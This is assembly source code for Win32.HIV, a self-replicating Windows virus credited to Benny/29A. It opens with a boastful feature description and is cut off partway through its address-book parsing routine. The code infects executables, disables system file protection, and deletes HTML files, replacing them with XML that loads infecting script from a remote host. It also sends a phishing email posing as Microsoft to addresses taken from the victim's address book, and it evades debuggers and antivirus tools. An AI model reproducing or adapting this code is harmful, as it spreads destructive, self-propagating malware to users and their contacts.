
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[HIV.ASM]ÄÄÄ
COMMENT#



                       	ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
                       	³    Win32.HIV    ³
                       	ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
                      ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
                      ³     by Benny/29A     ³
                      ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ


Finally I finished this virus... it took me more than 8 months to code it.
I hope you will like it and enjoy the new features it presents.
Here comes a deep description of Win32.HIV...


Kernel32 searching engine:
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
The virus can remember the last used base address of Kernel32.DLL. If the last
one is not valid, it can check the standard addresses, used under Win95/98/NT/2k.
Even if none of these addresses r valid, it can search thru address space of
current process and find the library. Everything of this is protected by
Structured Exception Handling.

API searching mechanism:
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
For Kernel32's APIz virus uses its own searching engine, using CRC32 instead
of stringz. For APIz from other libraries it uses GetProcAddress from K32.

Encryption of virus code:
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
The virus is encrypted by simple XOR mechanism, the encryption constant is
generated from the host code (the checksum). My idea for next viruses is
to code slow-polymorphic engine, where the shape of virus will depend on host
code checksum - something like "virus code depends on hosts DNA" :) AVerz will
have again some problems, becoz they will need to have enough different victim
filez to create valid pattern (for the scanner).

Direct action:
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
The virus infects ALL PE filez (also inside MSI filez) in current directory.
Infection of PE filez is done by appending to the last section. Infection of
PE filez inside MSIs is done by cavity algorithm:

- find a cave inside .code section
- put there viral code
- modify entrypoint

Into these PE filez not whole virus will be copied, but only a small chunk of
code, which will after execution display message and jump back to host. This
can be called as a payload.

The message loox like:
"[Win32.HIV] by Benny/29A"
"This cell has been infected by HIV virus, generation: " + 10-char number of
virus generation in decimal format.

EntryPoint Obscuring:
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
Yeah, this virus also uses EPO, which means: virus doesn't modify entrypoint,
it is executed "in-the-middle" of execution of host program. Again, this is
trick to fuck heuristic analysis :)
It overwrites procedure's epilog by <jmp virus> instruction. The epilog loox
like:

pop edi		05Fh
pop esi		05Eh
pop ebx		05Bh
leave		0C9h
ret		0C3h

Even if the sequence couldn't be found it infects the file - this will take
AVerz some time to understand :)

Multi-process residency:
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
This virus is multi-process resident, which means it can become resident in
ALL process in the system, not only in the current one. Virus does:

- find some process
- allocate memory in process and copy there virus itself
- hook FindFirstFileA,FindNextFileA,CreateFileA,CopyFileA and MoveFileA APIz
- find another process to infect and all again...

Very efficent! Imagine - you have executed WinCommander and accidently you
will execute virus. The virus become resident in ALL process, including
WinCommander, so every file manipulation will be caught by virus. If you will
open any file under WinCommander, virus will infect it! :)

The infection runs in separated thread and execution is passed to host code,
so you should not recognize any system slow down. Also, the ExitProcess API is
hooked, so the process can be terminated only when the infection is finished.

Per-process residency - hooking Internet:
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
Ah, yeah, this is really tricky stuff. The virus tries to hook InternetConnectA
API from WININET.DLL. If the host program will establish FTP connection, virus
will transfer itself by FTP to the root directory. And this really worx! :)

SFC stuff:
ÄÄÄÄÄÄÄÄÄÄÄ
All Win2k compatbile infectorz used SfcIsFileProtected API to check if victim
files r protected by system and if so, they didn't infect them. This infector
can disable SFC under Win98/2k/ME, so ALL filez (even the system ones) can be
infected! I would like to thank Darkman for his ideaz and SFC code.

Mail spreading:
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
The virus finds in registry the location of default address book file of Outlook
Express, gets 5 mail addresses from there and sends there infected XML document
(see bellow).

HTML infection (XML stuff):
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
Here I would like to thank Rajaat for his XSL idea (see XML stuff in 29A4).
The algorithm of HTML infection loox like:

- virus will disable showing extensions of HTML filez by adding "NeverShowExt"
  item to file properties in registry
- then create exactly same icon for XML filez as HTML filez have (now in
  explorer XML filez should look like HTML filez)
- find all .HTML filez in current directory
- delete them and create new filez with the same name and .HTML.XML extension
- write there XML code:

<?xml version="1.0"?>
<?xml:stylesheet type="text/xsl" href="http://coderz.net/benny/viruses/press.txt"?>
<i>This cell has been infected by HIV virus, generation: XXXXXXXXXX</i>

press.txt is XSL - XML stylesheet, which is loaded together with XML file and
can be placed anywhere on the internet. This XSL contains VBScript which will
infect computer. XML loox like clean - in fact, it is, but it uses template,
which is infected. I l0ve this stuff...:-)

NTFS stuff:
ÄÄÄÄÄÄÄÄÄÄÄÄ
The virus compresses infected filez placed on NTFS, so the infected filez
are usually smaller than the clean copies...user should not recognize any
space eating...;) Also, it contains next payload - using file streamz on NTFS.
Every infected file on NTFS will have new stream ":HIV" containing message:
"This cell has been infected by HIV virus, generation: " + 10-char number of
virus generation in decimal format.

All of this does not work with MSI filez.

Anti-*:
ÄÄÄÄÄÄÄÄ
Yeah, the virus uses some anti-* featurez, against debuggerz (check "debug_stuff"
procedure), heuristics (SALC opcode, non-suspicious code, EPO) and AVerz
(infected PE files grows by 16384 bytes, about 6,5 kb of virus code, the rest
is data from the end of host - if you will open the file and go to EOF, you
will not find any virus :)

Other features:
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
The virus doesn't check extensions of victim files, it just opens the file and
chex the internal format, if the file is suitable for infection.
Also, the bug can correct the checksum of infected file (if it is needed), so
there should not be any problem with infection of some files under WinNT/2k.

Known bugz:
ÄÄÄÄÄÄÄÄÄÄÄÄ
Here I would like to thank Perikles and Paddingx for beta-testing Win32.HIV.
I tried to fix all possible bugz, but no program is bug-free, right? :P



			ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
			³ Some comments ³
			ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

That was the small description of the virus. I was coding it verz long time,
since the winter 2000, right after Win2k.Installer was released. My idea was to
code virus which could defeat OS "immunity". Heh, and becoz the HIV virus does
the same with human body, I decided to name my virus so.

This virus passed with me all my personal problems and happiness. This year
my life was like on the rolercoaster. Once up, once down. Everything important
that happened to me... there was this virus with me... I'm glad that I finished
it, but I also feel great nostalgy.

Well, I would like to greet some of my friends that helped me or just were
with me and created good atmosphere of all the year.

Darkman:	That's a pity that we couldn't code next common virus. However,
		thnx for yer help, yer moral support and everything... come
		back to vx!
GriYo & Maia:	It was really wonderful time in Brno. I'm glad that you came.
		Just say weeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeed :)
Rajaat:		Many many many thnx for the atmosphere you created on our
		meeting... I really enjoyed it. Shroomz 4ever! :) btw, I want
		those CDs of Timothy Leary and Kate Bush :-)
Ratter:		Don't think you are, know you are!
Skag:		Psychedelic drugz rulez :P
Perikles:	Thanx for beta-testing dude!
Paddingx:	----------- " " ------------
GigaByte:	Very nice time in Brno... but'ta... next time: speak slowly :)
Lada:		Rather yes than ratter no :-) Thnx for the best holidayz I've
		ever had.
Petra:		H3y4, y4 g0t v3ry nIc3 b0dy :)
Queenie:	/me hugs ya :D
Timothy Leary:	Hey man, ya rule, yer death is the biggest lost for the world
		in this age...

Thnx to Marilyn Manson, Beatles, BeeGees, Beach Boys, Timothy Leary,
Kate Bush (hi Rajaat :) and other groupz/ppl for inspiration.


#


PID	equ	376


.386p					;386 protected mode instructions
.model flat				;flat model

include	MZ.inc				;some important include files
include	PE.inc
include	Win32API.inc
include	UseFul.inc


extrn	ExitProcess:PROC		;APIs for first generation of virus


PROCESS_VM_OPERATION		equ	0008h	;some equates
PROCESS_VM_READ			equ	0010h
PROCESS_VM_WRITE		equ	0020h
PROCESS_QUERY_INFORMATION	equ	0400h

virus_size			equ	16384	;size of virus in the file and
						;memory


@getsz	macro   msg2psh, reg		;macro to push NULL-terminated string
	local   next_instr		;to stack and pop address to register
	call    next_instr
	db      msg2psh,0
next_instr:
	pop	reg
endm

j_api	macro	API			;macro to construct JMP DWORD PTR [xxxxxxxx]
	dw	25FFh
API	dd	?
endm



.data
Start:						;start of virus in the file
	push	offset E_EPO			;save EPO address to stack (*)
epo_pos = dword ptr $-4
	pushad					;store all registers
	@SEH_SetupFrame	<jmp	end_host>	;setup SEH frame

	call	gdelta				;get delta offset
gdelta:	pop	ebp				;to EBP
	lea	esi,[ebp + encrypted - gdelta]	;get start of encrypted part
	mov	edi,esi				;save it to EDI
	mov	ecx,(end_virus-encrypted+3)/4	;size of encrypted part in DWORDs
decrypt:db	0D6h				;SALC opcode - ANTI-heuristic
       	lodsd					;get encrypted byte
	xor	eax,12345678h			;decrypt it
decr_key = dword ptr $-4
	stosd					;and save it
	loop	decrypt				;do it ECX-timez

encrypted:					;encrypted part of virus
	db	0D6h				;anti-heuritic
	call	get_base			;get base address of K32
	mov	[ebp + k32_base - gdelta],eax	;save it

	call	get_apis			;get addresses of all needed APIs
	call	debug_stuff			;check for debugger

	mov	eax,12345678h			;get generation number to EAX
generation_count = dword ptr $-4
	lea	edi,[ebp + gcount - gdelta]
	call	Num2Ascii			;save generation number in
						;decimal format
	call	sfc_stuff98			;disable SFC under Win98
	call	sfc_stuffME			;disable SFC under WinME
	call	sfc_stuff2k			;disable SFC under Win2k
	call	html_stuff			;infect ALL HTML documents in
						;current directory

	;direct action - infect all PE filez in current directory
	lea	esi,[ebp + WFD - gdelta]		;WIN32_FIND_DATA structure
	push	esi					;save its address
	@pushsz	'*.*'					;search for all filez
	call	[ebp + a_FindFirstFileA - gdelta]	;find first file
	inc	eax
	je	e_find				;quit if not found
	dec	eax
	push	eax				;save search handle to stack

f_next:	call	CheckInfect			;infect found file

	push	esi				;save WFD structure
	push	dword ptr [esp+4]		;and search handle from stack
	call	[ebp + a_FindNextFileA - gdelta];find next file
	test	eax,eax
	jne	f_next				;and infect it

f_close:call	[ebp + a_FindClose - gdelta]	;close search handle
e_find:	call	wab_parse			;get 5 addresses from .WAB file
	call	mapi_stuff			;and send there infected XML document

	and	dword ptr [ebp + r2rp - gdelta],0	;set 0 - host program
	and	dword ptr [ebp + ep_patch - gdelta],0	;semaphore for ExitProcess API

	;now we will hook InternetConnectA API of host program
	and	dword ptr [ebp + inet_k32 - gdelta],0	;use WININET library
	lea	eax,[ebp + newInternetConnectA - gdelta];address of new handler
	sub	eax,[ebp + image_base - gdelta]		;correct it to RVA
	push	eax					;save it
	push	06810962Dh				;CRC32 of InternetConnectA
	mov	eax,400000h				;image base of host file
image_base = dword ptr $-4
	call	patch_IT				;hook API
	mov	[ebp + oldInternetConnectA - gdelta],eax;save old address
	mov	[ebp + inet_k32 - gdelta],ebp		;use K32 library

	;now we will hook ExitProcess API of host program so host program could
	;be terminated only when virus thread will finish its action
	lea	eax,[ebp + newExitProcess - gdelta]	;address of new handler
	sub	eax,[ebp + image_base - gdelta]		;correct it to RVA
	push	eax					;save it
	push	040F57181h				;CRC32 of ExitProcess
	mov	eax,400000h				;image base of host file
image_base = dword ptr $-4
	call	patch_IT				;hook API
	test	eax,eax
	je	end_host				;quit if error
	mov	[ebp + oldExitProcess - gdelta],eax	;save old address

	mov	eax,cs					;get CS to EAX
	xor	al,al					;nulify LSB
	test	eax,eax					;EAX is 0, if we r
	jne	end_host				;under WinNT/2k...

	;now we will create thread which will try to infect all K32s in all
	;processes - multi-process residency
	call	_tmp
tmp	dd	?				;temporary variable
_tmp:	xor	eax,eax
	push	eax
	push	ebp
	lea	edx,[ebp + searchThread - gdelta]
	push	edx
	push	eax
	push	eax
	call	[ebp + a_CreateThread - gdelta]	;create new thread
	xchg	eax,ecx
	jecxz	end_host			;quit if error

	push	eax
	call	[ebp + a_CloseHandle - gdelta]	;close its handle

end_host:
	@SEH_RemoveFrame			;remove SEH frame
	mov	edi,[esp.cPushad]		;get EPO address (*)
	mov	eax,0C95B5E5Fh			;restore host code
	stosd					;...
	mov	al,0C3h				;...
	stosb					;...
	popad					;restore all registers
	ret					;and jump back to host


;this procedure can disable WinME's SFC
sfc_stuffME	Proc
	pushad					;store all registers
	@SEH_SetupFrame	<jmp	end_seh>	;setup SEH frame

	lea	edi,[ebp + reg_buffer - gdelta]	;where to save path to windir
	call	get_win_dir			;get path
	test	eax,eax
	je	end_seh				;quit if error

	push	edi
	add	edi,eax
	call	@sfcme
	db	'\SYSTEM\sfp\sfpdb.sfp',0	;store the path
@sfcme:	pop	esi
	push	22
	pop	ecx
	rep	movsb

	pop	ebx
	call	Create_FileA			;open the file
	inc	eax
	je	end_seh
	dec	eax
	xchg	eax,esi

	push	0
	push	esi
	call	[ebp + a_GetFileSize - gdelta]	;get file size to EDI
	xchg	eax,edi
	mov	[ebp + sfcme_size - gdelta],edi	;save it

	push	PAGE_READWRITE
	push	MEM_RESERVE or MEM_COMMIT
	push	edi
	push	0
	call	[ebp + a_VirtualAlloc - gdelta]	;allocate buffer for file
	test	eax,eax
	je	sfcme_file
	xchg	eax,ebx				;address to EBX

	push	0
	lea	eax,[ebp + tmp - gdelta]
	push	eax
	push	edi
	push	ebx
	push	esi
	call	[ebp + a_ReadFile - gdelta]	;read file content to our buffer

	pushad					;store all registerz
	mov	esi,ebx				;ESI - address of buffer
	mov	ecx,edi				;ECX - size of file
	mov	edi,esi				;EDI - ESI
	push	edi				;save base address of buffer

find_comma:
	lodsb					;load byte
	stosb					;store it
	dec	ecx				;decrement counter
	cmp	al,','
	jne	find_comma			;find comma
find_cr:dec	esi
	lodsw
	dec	ecx
	cmp	ax,0A0Dh
	jne	find_cr				;find CRLF sequence
	mov	eax,0A0D2C2Ch
	stosd					;save commas and CRLF
	inc	ecx
	loop	find_comma			;do it in a loop
	pop	eax				;get base address of buffer
	sub	edi,eax				;EDI - size of data
	mov	[esp.Pushad_eax],edi		;save it
	popad					;restore all registerz
	push	eax				;store size to stack

	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	esi				;move to beginning of file
	call	[ebp + a_SetFilePointer - gdelta]
	pop	ecx
	push	0
	lea	eax,[ebp + tmp - gdelta]
	push	eax
	push	ecx
	push	ebx
	push	esi
	call	[ebp + a_WriteFile - gdelta]	;write modified data (unprotect
	push	esi				;filez under WinME :-)
	call	[ebp + a_SetEndOfFile - gdelta]	;set EOF

	push	MEM_DECOMMIT
	push	12345678h
sfcme_size = dword ptr $-4
	push	ebx
	call	[ebp + a_VirtualFree - gdelta]
	push	MEM_RELEASE
	push	0
	push	ebx
	call	[ebp + a_VirtualFree - gdelta]	;release buffer memory
	jmp	sfcme_file			;close file and quit
sfc_stuffME	EndP


;this procedure can disable Win98's SFC
sfc_stuff98	Proc
	pushad					;store all registers
	@SEH_SetupFrame	<jmp	end_seh>	;setup SEH frame

	lea	edi,[ebp + reg_buffer - gdelta]	;where to save path to windir
	call	get_win_dir			;get path
	test	eax,eax
	je	end_seh				;quit if error

	mov	ebx,edi				;ECX = pointer to reg_buffer
	add	edi,eax

	mov	eax,'FED\'			;Store '\DEFAULT.SFC' after the
	stosd					;Windows directory
	mov	eax,'TLUA'
	stosd
	mov	eax,'CFS.'
	stosd

	call	Create_FileA			;open file
	inc	eax
	je	end_seh				;quit if error
	xchg	eax,esi
	dec	esi				;ESI = file handle

	lea	eax,[ebp + tmp - gdelta]
	push	0
	push	eax
	push	sfc98-_sfc98
	call	sfc98
_sfc98:	db	'VF',00h,01h,01h,0Fh dup(00h),'F',00h,00h,03h,00h,'C:\'
sfc98:	push	esi				;write new SFC record - disable
	call	[ebp + a_WriteFile - gdelta]	;SFC under Win98 :-)

	push	esi
	call	[ebp + a_SetEndOfFile - gdelta]	;truncate file

sfcme_file:
	push	esi
	call	[ebp + a_CloseHandle - gdelta]	;close file
	jmp	end_seh				;and quit
sfc_stuff98	EndP


;retrieve windows directory path from registry to EDI
get_win_dir:
	push	MAX_PATH
	push	edi
	@pushsz	'windir'			;store path to windows directory
	call	[ebp + a_GetEnvironmentVariableA - gdelta]
	ret

;this procedure can disable Win2k's SFC
sfc_stuff2k	Proc
	pushad					;store all registers
	@SEH_SetupFrame	<jmp	end_seh>	;setup SEH frame

	@getsz	'\WINNT\System32\sfcfiles.dll',edi	;path+filename

	lea	eax,[ebp + WFD - gdelta]
	push	eax
	push	edi				;find SFCFILES.DLL file
sfcfile:call	[ebp + a_FindFirstFileA - gdelta]
	inc	eax
	je	end_seh				;quit if not found
	dec	eax
	mov	[ebp + find_handle - gdelta],eax;save it handle

	lea	ebx,[ebp + WFD.WFD_szFileName - gdelta]
	call	Create_FileA			;open file
	inc	eax
	je	end_sfc
	dec	eax
	mov	[ebp + hsFile - gdelta],eax	;save handle

	call	Create_FileMappingA		;create file mapping object
	xchg	eax,ecx
	jecxz	end_scfile
	mov	[ebp + hsMapFile - gdelta],ecx	;save handle

	call	Map_ViewOfFile			;and map view of file to our
	xchg	eax,ecx				;address space
	jecxz	end_smfile
	mov	[ebp + lpsFile - gdelta],ecx	;save handle

	movzx	eax,word ptr [ecx]
	add	eax,-"ZM"
	jne	end_sfile			;must be MZ file

	mov	ebx,[ecx.MZ_lfanew]
	add	ebx,ecx				;move to PE header
	movzx	edx,word ptr [ebx.NT_FileHeader.FH_SizeOfOptionalHeader]
	lea	edx,[edx+ebx+(3*IMAGE_SIZEOF_FILE_HEADER+4)]
						;get to second section header
	cmp	[edx],'tad.'			;must be ".data"
	jne	end_sfile
	cmp	byte ptr [edx+4],'a'
	jne	end_sfile

	mov	esi,[edx.SH_PointerToRawData]	;get start of .data section
	add	esi,ecx				;make pointer RAW
	mov	ecx,[edx.SH_SizeOfRawData]	;get size of .data section

sfc_parse:
	and	dword ptr [esi],0		;nulify everything in that
	lodsd					;section
	sub	ecx,3				;correct counter
	loop	sfc_parse			;do it ECX-timez

end_sfile:
	push	12345678h
lpsFile = dword ptr $-4
	call	[ebp + a_UnmapViewOfFile - gdelta];unmap view of file from
end_smfile:					;our address space
	push	12345678h
hsMapFile = dword ptr $-4
	call	[ebp + a_CloseHandle - gdelta]	;close handle of mapping object
end_scfile:
	lea	eax,[ebp + WFD.WFD_ftLastWriteTime - gdelta]
	push	eax
	lea	eax,[ebp + WFD.WFD_ftLastAccessTime - gdelta]
	push	eax
	lea	eax,[ebp + WFD.WFD_ftCreationTime - gdelta]
	push	eax
	push	dword ptr [ebp + hsFile - gdelta]
	call	[ebp + a_SetFileTime - gdelta]	;set back file time

	push	12345678h
hsFile = dword ptr $-4
	call	[ebp + a_CloseHandle - gdelta]	;close file
end_sfc:push	12345678h
find_handle = dword ptr $-4
	call	[ebp + a_FindClose - gdelta]	;close search handle
	jmp	end_seh				;and quit from procedure
sfc_stuff2k	EndP


;this procedure can:
;1) hide .XML extensions by registry modification
;2) assign .HTML icon to .XML files - .XML filez loox like .HTML file then
;3) find all .HTML filez in current directory, delete them and instead of them
;   create .HTML.XML file with "infected" XML inside
;4) get path+filename to standard Outlook Express'es address book (.WAB file)
;   from registry

html_stuff	Proc
	@pushsz	'ADVAPI32'
	call	[ebp + a_LoadLibraryA - gdelta]	;load ADVAPI32.DLL library
	test	eax,eax
	jne	n_load_xml
	ret					;quit if error
n_load_xml:
	xchg	eax,ebx				;EBX = base of ADVAPI32.DLL

	@getsz	'RegCreateKeyA',edx
	call	@get_api			;get address of RegCreateKeyA API
	xchg	eax,ecx
	jecxz	end_xml_lib
	mov	esi,ecx				;ESI = RegCreateKeyA

	@getsz	'RegSetValueExA',edx
	call	@get_api			;get address of RegSetValueA API
	xchg	eax,ecx
	jecxz	end_xml_lib
	mov	edi,ecx				;EDI = RegSetValueExA

	@getsz	'RegCloseKey',edx
	call	@get_api			;get address of RegCloseKey API
	xchg	eax,ecx
	jecxz	end_xml_lib
	mov	[ebp + a_RegCloseKey - gdelta],ecx;save it

	call	hide_xml			;hide .XML
	call	chg_xml_icon			;.XML icon = .HTML icon
	call	search_html			;infect all .HTML filez in
						;current directory
end_xml_reg:
	push	12345678h
reg_key = dword ptr $-4
	call	[ebp + a_RegCloseKey - gdelta]	;close registry key
end_xml_reg2:
	push	dword ptr [ebp + tmp - gdelta]
	mov	eax,12345678h
a_RegCloseKey = dword ptr $-4
	call	eax				;...
end_xml_lib:
	push	ebx
	call	[ebp + a_FreeLibrary - gdelta]	;unload ADVAPI32.DLL library
	ret					;and quit

;this procedure can copy icon from .html to .xml filez and get path+filename of
;default WAB file
chg_xml_icon:
	lea	ecx,[ebp + reg_key - gdelta]
	push	ecx
	@pushsz	'htmlfile'
	push	80000000h
	call	esi				;open "HKEY_CLASSES_ROOT\htmlfile"
	test	eax,eax
	pop	eax
	jne	end_xml_reg2			;quit if error
	push	eax

	@getsz	'RegQueryValueA',edx
	call	@get_api			;get address of RegQueryValueA API
	xchg	eax,ecx				;ECX = RegQueryValueA
	jecxz	end_xml_lib

	pushad					;store all registers
	call	@pword1
	dd	MAX_PATH
@pword1:lea	eax,[ebp + wab_buffer - gdelta]
	push	eax
	@pushsz	'Software\Microsoft\WAB\WAB4\Wab File Name'
	push	80000001h
	call	ecx		;copy value of "HKEY_CURRENT_USER\
	popad			;\Software\Microsoft\WAB\WAB4\Wab File Name"
				;to wab_buffer variable - path+filename of WAB file
        call	@pword2
	dd	MAX_PATH
@pword2:lea	eax,[ebp + reg_buffer - gdelta]
	push	eax
	call	@dicon
def_ico:db	'DefaultIcon',0
@dicon:	push	dword ptr [ebp + reg_key - gdelta]
	call	ecx		;get value of "HKEY_CLASSES_ROOT\htmlfile\DefaultIcon"
	test	eax,eax		;to reg_buffer
	pop	eax
	jne	end_xml_reg
	push	eax

	lea	ecx,[ebp + tmp - gdelta]
	push	ecx
	lea	ecx,[ebp + def_ico - gdelta]
	push	ecx
	push	dword ptr [ebp + tmp - gdelta]
	call	esi		;open "HKEY_CLASSES_ROOT\xmlfile\DefaultIcon"
	test	eax,eax
	pop	eax
	jne	end_xml_reg2
	push	eax

	lea	esi,[ebp + reg_buffer - gdelta]
	mov	ecx,esi
	@endsz
	sub	esi,ecx

	push	esi
	push	ecx
	push	2
	push	0
	push	0
	push	dword ptr [ebp + tmp - gdelta]
	call	edi		;write icon from \htmlfile to \xmlfile
	test	eax,eax		;error?
	pop	eax		;get return address
	jne	end_xml_reg	;quit
	jmp	eax		;continue

;address for getting API addresses
;EBX - base of library
;EDX - name of API
@get_api:
	push	edx
	push	ebx
	call	[ebp + a_GetProcAddress - gdelta]
	ret

;this procedure can hide extension of .XML filez
hide_xml:
	lea	ecx,[ebp + tmp - gdelta]
	push	ecx
	@pushsz	'xmlfile'
	push	80000000h
	call	esi		;open "HKEY_CLASSES_ROOT\xmlfile"
	test	eax,eax
	pop	eax
	jne	end_xml_lib
	push	eax

	push	0
	push	ebp
	push	1
	push	0
	@pushsz	'NeverShowExt'
	push	dword ptr [ebp + tmp - gdelta]
	call	edi		;create new item - NeverShowExt - this will
	test	eax,eax		;hide .XML extension under Windows.
	pop	eax
	jne	end_xml_lib
	jmp	eax

;this procedure can infect all .HTML documents in current directory
search_html:
	pushad					;store all registers
	lea	ebx,[ebp + WFD - gdelta]	;address of WFD record
	push	ebx
	@pushsz	'*.html'			;find some .HTML file
	call	[ebp + a_FindFirstFileA - gdelta]
	inc	eax
	je	end_html_search			;quit if no .HTML file was found
	dec	eax
	mov	[ebp + fhtmlHandle - gdelta],eax;save search handle

i_html:	call	infect_html			;infect .HTML file

	push	ebx				;WFD record
	push	12345678h			;search handle
fhtmlHandle = dword ptr $-4
	call	[ebp + a_FindNextFileA - gdelta];find next .HTML file
	test	eax,eax
	jne	i_html				;and infect it

	push	dword ptr [ebp + fhtmlHandle - gdelta]
	call	[ebp + a_FindClose - gdelta]	;close search handle
end_html_search:
	popad					;restore all registers
	ret					;and quit from procedure

;this procedure can infect found .HTML file
infect_html:
	pushad					;store all registers
	lea	esi,[ebx.WFD_szFileName]	;found .HTML file
	push	esi
	call	[ebp + a_DeleteFileA - gdelta]	;delete it

	push	esi
	@endsz
	dec	esi
	mov	eax,'lmx.'
	mov	edi,esi
	stosd					;create .XML extension
	xor	al,al
	stosb
	pop	ebx
g_xml:	call	Create_FileA			;create .HTML.XML file
	xchg	eax,edi
	inc	edi
	je	end_infect_html
	dec	edi

	push	0
	call	@wftmp
	dd	?
@wftmp:	push	end_xml-start_xml
	call	end_xml
start_xml:					;start of "infected" XML document
	db	'<?xml version="1.0"?>'
	db	'<?xml:stylesheet type="text/xsl" href="http://coderz.net/benny/viruses/press.txt"?>'
	db	'<i>'
end_xml:push	edi
	call	[ebp + a_WriteFile - gdelta]	;write first part of XML document

	push	0
	lea	ebx,[ebp + @wftmp-4 - gdelta]
	push	ebx
	push	szMsg-1-p_msg
	lea	eax,[ebp + p_msg - gdelta]
	push	eax
	push	edi
	call	[ebp + a_WriteFile - gdelta]	;write message to XML document
	
	push	0
	push	ebx
	push	4
	call	@endxml
	db	'</i>'
@endxml:push	edi
	call	[ebp + a_WriteFile - gdelta]	;and final tag

	push	edi
	call	[ebp + a_CloseHandle - gdelta]	;close file
end_infect_html:
	popad					;restore all registers
	ret					;and quit - HTML is now infected :)
html_stuff	EndP


;create infected c:\press.xml file
@i_html:pushad
	@getsz	'c:\press.xml',ebx
	jmp	g_xml


;this procedure can send "infected" XML document to 5 mail addresses via MAPI32
mapi_stuff	Proc
	pushad
	call	@i_html			;generate XML file

	@pushsz	'MAPI32'		;load MAPI32.DLL library
	call	[ebp + a_LoadLibraryA - gdelta]
	test	eax,eax
	je	end_infect_html
	xchg	eax,ebx			;EBX - base of MAPI32

	@getsz	'MAPILogon',edx
	call	@get_api		;get address of MAPILogon API
	test	eax,eax
	je	end_mapi
	xchg	eax,esi			;ESI - address of MAPILogon

	@getsz	'MAPILogoff',edx
	call	@get_api		;get address of MAPILogoff API
	test	eax,eax
	je	end_mapi
	xchg	eax,edi			;EDI - address of MAPILogoff

	@getsz	'MAPISendMail',edx
	call	@get_api		;get address of MAPISendMail API
	test	eax,eax
	je	end_mapi
	mov	[ebp + a_MAPISendMail - gdelta],eax
					;save it
	xor	edx,edx
	lea	eax,[ebp + tmp - gdelta];mapi session ptr
	push	eax
	push	edx
	push	edx
	lea	eax,[ebp + nextPID-1 - gdelta]
	push	eax
	push	eax
	push	edx
	call	esi			;log on to MAPI32
	test	eax,eax
	jne	end_mapi

	;generate MAPI32 message
	push	edi
	lea	edi,[ebp + MAPIMessage - gdelta]
	stosd
	@getsz	'XML presentation',eax	;subject
	stosd
	call	@msgbody
	db	'Please check out this XML presentation and send us your opinion.',0dh,0ah
	db 	'If you have any questions about XML presentation, write us.',0dh,0ah,0dh,0ah,0dh,0ah
	db	'Thank you,',0dh,0ah,0dh,0ah
	db	'The XML developement team, Microsoft Corp.',0
@msgbody:
	pop	eax
	stosd				;message body
	add	edi,4
	@getsz	'2010/06/06 22:00',eax	;date and time
	stosd
	add	edi,4
	push	2
	pop	eax
	stosd
	lea	eax,[ebp + MsgFrom - gdelta]
	stosd				;sender

	push	5
	pop	eax			;number of recipients
	stosd
	lea	eax,[ebp + MsgTo - gdelta]
	stosd				;recipients
	xor	eax,eax
	inc	eax
	stosd
	lea	eax,[ebp + MAPIFileDesc - gdelta]
	stosd

	add	edi,4*2
	lea	eax,[ebp + nextPID-1 - gdelta]
	stosd
	@getsz	'press@microsoft.com',eax
	stosd				;sender
	add	edi,4*2

	push	5
	pop	ecx

	xor	eax,eax
msgTo:	stosd			;0
	inc	eax
	stosd			;1
	dec	eax
	stosd			;0
	imul	eax,ecx,22h
	lea	eax,[eax + ebp + mails - gdelta-22h]	
	stosd			;get next email address from WAB - recipient
	xor	eax,eax
	stosd			;0
	stosd			;0
	loop	msgTo		;5 timez

	add	edi,4*3

	lea	eax,[ebp + @i_html+6 - gdelta]
	stosd			;name of file attachment
	stosd			;...
	add	edi,4

	xor	eax,eax
	push	eax
	push	eax
	lea	ecx,[ebp + MAPIMessage - gdelta]
	push	ecx		;message
	push	eax
	push	dword ptr [ebp + tmp - gdelta]
	mov	eax,12345678h
a_MAPISendMail = dword ptr $-4
	call	eax		;send E-MAIL !

	pop	edi
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	dword ptr [ebp + tmp - gdelta]
	call	edi		;close MAPI session

end_mapi:
	push	ebx
	call	[ebp + a_FreeLibrary - gdelta]	;unload MAPI32.DLL
	popad					;restore all registers
	ret					;and quit from procedure
mapi_stuff	EndP


;this procedure can get 5 e-mail addresses from Outlook Express'es default
;address-book - .WAB file
wab_parse	Proc
	pushad			;store all registers
	@SEH_SetupFrame	<jmp	end_seh>
				;setup SEH frame

	lea	ebx,[ebp + wab_buffer - gdelta]
	call	Create_FileA	;open WAB file
	inc	eax
	je	end_seh		;quit if error
	dec	eax
	mov	[ebp + wFile - gdelta],eax
				;store handle
	call	Create_FileMappingA
	xchg	eax,ecx		;create file mapping object
	jecxz	end_wfile
	mov	[ebp + wMapFile - gdelta],ecx
				;store handle
	call	Map_ViewOfFile	;map view of file to our address space
	xchg	eax,ecx
	jecxz	end_wmfile
	mov	[ebp + wlpFile - gdelta],ecx
	jmp	next_wab	;save handle

end_wab:push	12345678h
